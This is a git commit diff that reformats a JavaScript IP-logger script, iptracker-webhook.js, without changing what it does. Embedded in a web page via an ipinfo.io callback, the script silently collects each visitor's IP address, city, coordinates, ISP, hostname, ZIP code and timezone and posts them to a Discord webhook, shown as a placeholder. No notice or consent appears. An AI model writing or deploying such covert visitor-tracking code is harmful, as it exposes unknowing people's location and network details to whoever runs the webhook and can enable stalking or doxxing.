b8f74bc3b7839140e13d0923777cb3f0b52b8a54
neast <92998984+ghostneast@users.noreply.github.com>
2023-03-13 23:59:53 -0300

    aesthetic improvement

--- iptracker-webhook.js
+++ iptracker-webhook.js
@@ -1,30 +1,31 @@
-/*
-Notice this a initial template for this purpose.
-You're totally free to increase and make this code better for your purpose.
-On your HTML code insert:
-<script src="https://ipinfo.io/?format=jsonp&callback=collectInfo"></script>
-*/
+function collectInfo(json) {
+  // Create a new XMLHttpRequest object
+  var wbRequest = new XMLHttpRequest();
 
+  // Set the destination URL for the webhook
+  wbRequest.open("POST", "WEBHOOK LINK");
 
-function collectInfo(json) 
-{
-     var wbRequest = new XMLHttpRequest();
-     
-    wbRequest.open("POST", "WEBHOOK LINK");
-    wbRequest.setRequestHeader('Content-type', 'application/json');
+  // Set the content type for the request
+  wbRequest.setRequestHeader('Content-type', 'application/json');
 
-     var params = 
-     {
-          username: "DISCORD WEBHOOK NICKNAME",
-          avatar_url: "DISCORD WEBHOOK URL",
-          content: "DISCORD WEBHOOK MESSAGE CONTENT\n",
-          embeds: [
-               {
-                    title: "EMBED TITLE",
-                    color: 0000000,     
-                    description: "**IP:** `" + json.ip + "`\n**Region:** `" + json.country + ", " + json.region + ", " + json.city + "`\n**Coords.:** `" + json.loc + "`\n\n**Provider:** `" + json.org + "`\n**Host:** `" + json.hostname + "`\n\n**ZIP Code:** `" + json.postal + "`\n**Timezone:** `" + json.timezone + "`"
-               }
-          ]
-     }
-     wbRequest.send(JSON.stringify(params));
+  // Set the payload for the webhook
+  var params = {
+    username: "DISCORD WEBHOOK NICKNAME",
+    avatar_url: "DISCORD WEBHOOK URL",
+    content: "DISCORD WEBHOOK MESSAGE CONTENT\n",
+    embeds: [{
+      title: "EMBED TITLE",
+      color: 0000000,
+      description: `**IP:** \`${json.ip}\`\n` +
+                   `**Region:** \`${json.country}, ${json.region}, ${json.city}\`\n` +
+                   `**Coords.:** \`${json.loc}\`\n\n` +
+                   `**Provider:** \`${json.org}\`\n` +
+                   `**Host:** \`${json.hostname}\`\n\n` +
+                   `**ZIP Code:** \`${json.postal}\`\n` +
+                   `**Timezone:** \`${json.timezone}\``
+    }]
+  };
+
+  // Send the request with the payload as a JSON string
+  wbRequest.send(JSON.stringify(params));
 }
